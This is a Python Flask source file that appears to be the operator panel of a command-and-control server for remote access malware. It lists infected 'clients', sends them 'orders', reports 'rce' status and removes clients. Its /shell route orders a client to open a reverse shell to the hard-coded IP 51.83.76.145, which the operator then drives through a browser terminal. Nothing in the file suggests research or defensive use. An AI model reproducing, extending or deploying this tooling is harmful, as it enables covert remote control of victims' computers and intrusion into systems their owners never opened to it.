#!/usr/bin/env python
# coding=utf-8

import os
import sys
import pty
import fcntl
import shlex
import select
import struct
import random
import termios
import logging
import threading
import subprocess
from client import *
from dns import response
from flask_socketio import SocketIO
from flask import Flask, jsonify, send_from_directory, request, render_template, url_for, redirect

app = Flask(__name__)
app.config["SECRET_KEY"] = "D@rK$34l"
app.config["fd"] = None
app.config["child_pid"] = None
app.config["cmd"] = ["bash"]
socketio = SocketIO(app, cors_allowed_origins="*")

ports = []

'''
# disable logging
app.logger.disabled = True
log = logging.getLogger('werkzeug')
log.disabled = True

# disable flask banner
cli = sys.modules['flask.cli']
cli.show_server_banner = lambda *x: None
'''

# routes
@app.route("/")
def index():
	return render_template("index.html")


@app.route("/api/get")
def get():
	if 'clients' in request.args:
		info = []
		for i in clients:
			inf =  clients[i].get_info()
			try:
				inf["frequency"] = response[i]["5"]
			except :
				inf["frequency"] = "2000"
			try:
				inf["rce"] = response[i]["2"]
			except :
				inf["rce"] = "N/A"
			info.append(inf)
		return jsonify(info)

	elif 'client' in request.args:
		client_id = request.args.get('client')
		try:
			info =  clients[client_id].get_info()
			try:
				info["frequency"] = response[client_id]["5"]
			except :
				info["frequency"] = "2000"
			try:
				info["rce"] = response[client_id]["2"]
			except :
				info["rce"] = "N/A"
			return jsonify(info)
		except :
			return jsonify({'status' : 'fail'})

	elif 'response' in request.args:
		return jsonify(response)


@app.route("/api/set")
def set():
	if 'client' in request.args and 'order' in request.args:
		client_id = request.args.get('client')
		order_id = request.args.get('order')
		clients[client_id].order.append(order_id)
		return jsonify({'status' : 'success'})

	if 'timeout' in request.args and 'check_pulse' in request.args:
		timeout = request.args.get('timeout')
		check_pulse(clients, int(timeout));
		return jsonify({'status' : 'success'})


@app.route("/api/del")
def delete():
	if 'client' in request.args:
		client_id = request.args.get('client')
		del clients[client_id]
		return jsonify({'status' : 'success'})


@app.route("/shell")
def shell():
	if 'client' in request.args:
		client_id = request.args.get('client')
		port = random.randint(1024, 65535)
		while port in ports:
			port = random.randint(1024, 65535)
		ports.append(port)
		clients[client_id].order.append("3;51.83.76.145;"+str(port))
		return render_template("shell.html", port=str(port))


@app.route("/release")
def release():
	if 'port' in request.args:
		port = request.args.get('port')
		ports.remove(int(port))
	return jsonify({'status' : 'success'})


# reverse webshell
def read_and_forward_pty_output():
	max_read_bytes = 1024 * 20
	while True:
		socketio.sleep(0.01)
		if app.config["fd"]:
			timeout_sec = 0
			(data_ready, _, _) = select.select([app.config["fd"]], [], [], timeout_sec)
			if data_ready:
				try:
					output = os.read(app.config["fd"], max_read_bytes).decode("cp850")
				except :
					try:
						output = os.read(app.config["fd"], max_read_bytes).decode("cp1252")
					except :
						output = os.read(app.config["fd"], max_read_bytes).decode("utf-8")
				socketio.emit("pty-output", {"output": output}, namespace="/pty")


@socketio.on("pty-input", namespace="/pty")
def pty_input(data):
	if app.config["fd"]:
		os.write(app.config["fd"], data["input"]["key"].encode())


@socketio.on("nc", namespace="/pty")
def nc(data):
	if app.config["fd"]:
		os.write(app.config["fd"], data["input"].encode())


@socketio.on("disconnect", namespace="/pty")
def disconnect():
	os.kill(app.config["child_pid"], 9)
	app.config["child_pid"] = None


@socketio.on("connect", namespace="/pty")
def connect():
	if app.config["child_pid"]:
		return
	(child_pid, fd) = pty.fork()
	if child_pid == 0:
		subprocess.run(app.config["cmd"])
	else:
		app.config["fd"] = fd
		app.config["child_pid"] = child_pid
		cmd = " ".join(shlex.quote(c) for c in app.config["cmd"])
		socketio.start_background_task(target=read_and_forward_pty_output)
		os.write(app.config["fd"], "cd && clear\n".encode())


def start_api():
	socketio.run(app, host="0.0.0.0", port=80)